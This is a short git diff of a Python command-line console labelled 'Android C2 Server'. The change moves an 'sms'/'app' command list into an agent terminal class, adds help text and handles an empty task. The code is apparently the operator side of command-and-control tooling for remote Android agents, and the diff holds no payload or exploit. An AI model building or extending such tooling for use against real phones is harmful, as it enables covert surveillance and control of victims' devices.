@@ -1,9 +1,5 @@
 from cmd import Cmd
-import shutil
-import os
 import main
-
-commands = ["sms", "app"]
 
 class Terminal(Cmd):
     intro = "Android C2 Server\nType help or ? to list commands\n"
@@ -58,12 +54,20 @@ class Terminal(Cmd):
             print("[-] No active agents")
 
 class Agent_Terminal(Cmd):
+    commands = ["sms", "app"]
+
     def do_task(self, args):
-        print(f"Agent task: {main.agent_command.get(main.interacted_agent, '')}")
+        "Displays the current task for the agent"
+        task = main.agent_command.get(main.interacted_agent, '')
+        if task != '':
+            print(f"Agent task: {main.agent_command.get(main.interacted_agent, '')}")
+        else:
+            print("No task given")
 
     # Agent commands here
     def do_do(self, args):
-        if args in commands:
+        "Usage: do <command>\n\nCurrent commands: sms, app\n"
+        if args in self.commands:
             with open(f"task/{main.interacted_agent}", "w") as f:
                 f.write(args)
         else:
